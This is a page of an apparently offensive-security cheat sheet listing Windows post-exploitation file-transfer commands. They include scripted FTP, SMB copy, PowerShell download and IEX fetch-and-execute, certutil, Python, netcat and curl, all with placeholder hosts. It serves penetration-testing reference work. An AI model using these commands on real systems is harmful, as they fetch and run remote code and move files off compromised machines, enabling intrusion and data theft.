# Windows

<pre><code><strong># FTP 
</strong>echo open &#x3C;IP> 21 > ftp.txt echo anonymous>> ftp.txt echo password>> ftp.txt echo binary>> ftp.txt echo GET &#x3C;FILE> >> ftp.txt echo bye>> ftp.txt
ftp -v -n -s:ftp.txt

# SMB
copy \\&#x3C;IP>\&#x3C;PATH>\&#x3C;FILE> # Linux -> Windows
copy &#x3C;FILE> \\&#x3C;IP>\&#x3C;PATH>\ # Windows -> Linux

# Powershell
powershell.exe (New-Object System.Net.WebClient).DownloadFile('&#x3C;URL>', '&#x3C;DESTINATION_FILE>')
powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('&#x3C;URL>')
powershell "wget &#x3C;URL>"

# Python
python.exe -c "from urllib import urlretrieve; urlretrieve('&#x3C;URL>', '&#x3C;DESTINATION_FILE>')"

# CertUtil
certutil.exe -urlcache -split -f "&#x3C;URL>"

# NETCAT
nc -lvp 1234 > &#x3C;OUT_FILE> 
nc &#x3C;IP> 1234 &#x3C; &#x3C;IN_FILE>

# CURL
curl &#x3C;URL> -o &#x3C;OUT_FILE>
</code></pre>

[PreviousReverse Shells](https://pentestbook.six2dez.com/exploitation/reverse-shells)[Next](https://pentestbook.six2dez.com/post-exploitation/linux)
